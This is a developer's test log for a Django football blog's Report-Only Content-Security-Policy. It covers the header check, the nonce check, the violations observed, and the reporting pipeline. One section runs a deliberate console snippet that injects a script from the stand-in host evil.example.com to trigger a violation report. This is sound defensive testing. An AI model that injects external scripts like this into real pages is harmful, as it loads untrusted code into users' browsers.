# CSP Browser Testing — Results & Steps

**Project:** MyFootballBlog (Django, `django-csp` 4.0)
**Mode tested:** `Content-Security-Policy-Report-Only`
**Environment:** Local dev server (`http://127.0.0.1:8000/`), Chrome DevTools
**Date:** 2026-08-10

## Purpose

Verify that the Report-Only CSP header is being sent, correctly parsed by the browser, and that violations are detected, logged to the console, and reported to `/csp-report/` — without anything being blocked.

This is the detailed step-by-step test log. For the policy configuration itself (what's allowed and why) and the rollout plan, see [`CSP_NOTES.md`](CSP_NOTES.md).

---

## Step 1: Open DevTools on the correct tab

CSP testing must be done in DevTools attached to the **app's own tab**, not any other open tab (e.g. this chat). An early check accidentally inspected the wrong tab (not separately screenshotted).

The Network panel was empty (`0 / 26 requests`) because no requests from the football hub app were being captured — DevTools was inspecting `claude.ai`, not `127.0.0.1:8000`.

**Fix:** open a new tab, navigate to `http://127.0.0.1:8000/`, *then* open DevTools (F12) on that tab.

---

## Step 2: Confirm the Report-Only header is sent

With DevTools correctly attached to the app tab → **Network** tab → reload → click the top document request (`127.0.0.1`) → **Headers**:

![Response headers showing the Content-Security-Policy-Report-Only value](02-headers-response.png)

Confirmed header, `200 OK` on `GET http://127.0.0.1:8000/`:

```
Content-Security-Policy-Report-Only:
  font-src 'self' https://cdn.jsdelivr.net;
  base-uri 'self';
  img-src 'self';
  frame-ancestors 'none';
  style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net;
  object-src 'none';
  connect-src 'self';
  form-action 'self';
  default-src 'self';
  frame-src 'none';
  script-src 'self' 'nonce-DFxC4WwalRhsut0INTBivA==' https://cdn.jsdelivr.net https://unpkg.com;
  report-uri /csp-report/
```

**Checks passed:**
- Header present and correctly formatted
- `object-src 'none'` and `frame-ancestors 'none'` — locked down as intended
- `script-src` includes a per-request nonce (`nonce-DFxC4WwalRhsut0INTBivA==`)
- `report-uri /csp-report/` points at the app's violation endpoint

**Flagged for review:** `https://cdn.jsdelivr.net` and `https://unpkg.com` are allowed in `script-src`; `cdn.jsdelivr.net` is also allowed in `font-src` and `style-src`. Confirm these are only as broad as CKEditor/dependencies actually require.

---

## Step 3: Verify the nonce matches an inline script tag

**Elements** tab → locate an inline `<script nonce="...">` tag → confirm the value matches the nonce in the response header from Step 2, and that it changes on every page reload.

*(Not separately screenshotted — confirm this manually per reload.)*

---

## Step 4: Browse the app and watch the Console for violations

**Console** tab, browsing normal pages (homepage, post detail, login, CKEditor edit view, profile, admin):

![Console showing a real img-src violation and a deliberate test script-src violation](03-console-violations.png)

The Console showed a "3 Issues" indicator, but only two distinct violations were reviewed live in DevTools during this session. Cross-checking `logs/csp_violations.log` afterwards (46 entries total, spanning 13:51–14:38) surfaced the third and showed it's actually the *most frequent* source, not a one-off:

| Violation | Count in log |
|---|---|
| `img-src` — inline `data:` SVG | 17 |
| `img-src` — `https://flagcdn.com/...` | 26 |
| `script-src` — deliberate `evil.example.com` test | 3 |

### a) Real violation — inline `data:` SVG blocked by `img-src`

```
Loading the image 'data:image/svg+xml;...' violates the following Content
Security Policy directive: "img-src 'self'". The policy is report-only, so
the violation has been logged but no further action has been taken.
```

Something on the page loads an inline SVG via a `data:` URI, which the current `img-src 'self'` does not permit. **Not yet identified** — the log entries for this one carry no `source-file`/`line-number` (e.g. `"blocked-uri": "data"` with no location), so it wasn't pinned down via the log alone. Likely source: Bootstrap 5's own CSS, which embeds several UI icons (form-check marks, close buttons, carousel controls) as `data:` URI `background-image`s — worth checking there first, since Bootstrap 5.3.3 is loaded from `cdn.jsdelivr.net` (see `templates/base.html`) and CSP's `img-src` also governs CSS `background-image`, not just `<img>` tags. **Action item:** open DevTools on a page that reproduces it, click the file/line link next to the warning, and confirm before deciding on a fix.

**Proposed fix**, once confirmed as legitimate app behavior:

```python
"img-src": ["'self'", "data:"],
```

`data:` URIs in `img-src` are low-risk (can't execute code), unlike `data:` in `script-src`.

### b) Real violation, previously undocumented — `flagcdn.com` blocked by `img-src`

```
Loading the image 'https://flagcdn.com/w40/fr.png' violates the following
Content Security Policy directive: "img-src 'self'". The policy is
report-only, so the violation has been logged but no further action has
been taken.
```

**Confirmed source:** `blog/services/homepage.py:22-23` hardcodes
`france_flag = {"url": "https://flagcdn.com/w40/fr.png"}` and the Morocco
equivalent; both are rendered via `<img src="{{ france_flag.url }}">` in
`templates/components/match_block.html`. Unlike the `data:` SVG above, this
has a clear `source-file`/`line-number` in the log and fires on almost
every page (homepage, dashboard, login, category pages) — it's the single
largest violation source, 26 of 46 logged reports.

**Fix options**, neither applied yet:
1. Add `https://flagcdn.com` to `img-src` (simplest; adds one more external
   host to trust, consistent with the existing `cdn.jsdelivr.net`/`unpkg.com`
   entries elsewhere in the policy).
2. Self-host the two flag images under `static/` (keeps `img-src 'self'`
   fully closed; better if no other CDN flag images are planned later).

This must be resolved one way or the other before switching to enforced
mode — see `CSP_NOTES.md` section 4.

### c) Deliberate test violation — external script injection

Console test used to confirm the reporting pipeline end-to-end:

```js
var s = document.createElement('script');
s.src = 'https://evil.example.com/test.js';
document.head.appendChild(s);
```

Result:

```
Loading the script 'https://evil.example.com/test.js' violates the following
Content Security Policy directive: "script-src 'self' 'nonce-...'
https://cdn.jsdelivr.net https://unpkg.com". Note that 'script-src-elem' was
not explicitly set, so 'script-src' is used as a fallback. The policy is
report-only, so the violation has been logged but no further action has
been taken.
```

The subsequent `net::ERR_NAME_NOT_RESOLVED` is expected — `evil.example.com` is not a real domain — and is unrelated to CSP; the policy detection itself worked correctly.

**Note:** DevTools also required typing `allow pasting` before the console would accept the pasted test snippet — this is a Chrome anti-self-XSS safeguard, not a CSP behavior.

---

## Step 5: Confirm reports land in the violation log

For each violation above, a `POST /csp-report/` request should appear in the **Network** tab returning `204`, and a corresponding entry should appear in the log:

```powershell
Get-Content logs\csp_violations.log -Wait -Tail 20
```

**Confirmed.** `logs/csp_violations.log` has 46 entries from this session (2026-08-10, 13:51–14:38), one representative line per violation type below (trimmed to the fields that matter — the full entries also carry the complete `original-policy` string):

```
# a) data: SVG — no source-file/line-number, hence "not yet identified" above
{"document-uri": "http://127.0.0.1:8000/", "violated-directive": "img-src",
 "blocked-uri": "data", "status-code": 200}

# b) flagcdn.com — has source-file/line-number, hence "confirmed source" above
{"document-uri": "http://127.0.0.1:8000/", "violated-directive": "img-src",
 "blocked-uri": "https://flagcdn.com/w40/fr.png", "line-number": 287,
 "source-file": "http://127.0.0.1:8000/", "status-code": 200}

# c) deliberate test violation
{"document-uri": "http://127.0.0.1:8000/category/transfers/",
 "violated-directive": "script-src-elem",
 "blocked-uri": "https://evil.example.com/test.js", "line-number": 3,
 "column-number": 15, "status-code": 200}
```

---

## Outstanding items

| Item | Status |
|---|---|
| Header sends correctly in Report-Only mode | ✅ Confirmed |
| Nonce present and scoped to `script-src` | ✅ Confirmed |
| `object-src` / `frame-ancestors` locked to `'none'` | ✅ Confirmed |
| Test violation (`evil.example.com`) reported | ✅ Confirmed |
| `/csp-report/` logging pipeline | ✅ Confirmed — 46 entries in `logs/csp_violations.log`, see Step 5 |
| Console "3 Issues" indicator | ✅ Resolved — third issue was `flagcdn.com` (found via the log, not the Issues tab); see 4b |
| `flagcdn.com` violation (`img-src`) | ⚠️ Source confirmed (`blog/services/homepage.py:22-23`) — fix (allowlist vs self-host) not yet chosen or applied |
| Real `img-src` violation (inline `data:` SVG) | ⚠️ Still needs investigation — locate source element (log entries have no `source-file`) |
| Full click-through (admin, CKEditor edit, comments/AJAX) | ⏳ Not yet completed |
| `unsafe-inline` in `style-src` (CKEditor) | Documented separately in `CSP_NOTES.md` |

## Next steps

1. Identify the element/script generating the inline SVG `data:` URI and confirm whether adding `data:` to `img-src` is the right fix (start with Bootstrap 5's CSS — see 4a).
2. Decide and apply the fix for `flagcdn.com`: add `https://flagcdn.com` to `img-src`, or self-host the France/Morocco flag images used in `blog/services/homepage.py`.
3. Complete the click-through of remaining pages (admin, CKEditor save flow, comments/AJAX features) with the log tailing.
4. Test in an Incognito window with extensions disabled to rule out extension-injected false positives.
5. Once the violation log is clean over a real traffic window, revisit `CSP_NOTES.md`'s checklist for promoting `CONTENT_SECURITY_POLICY_REPORT_ONLY` to enforced `CONTENT_SECURITY_POLICY`.
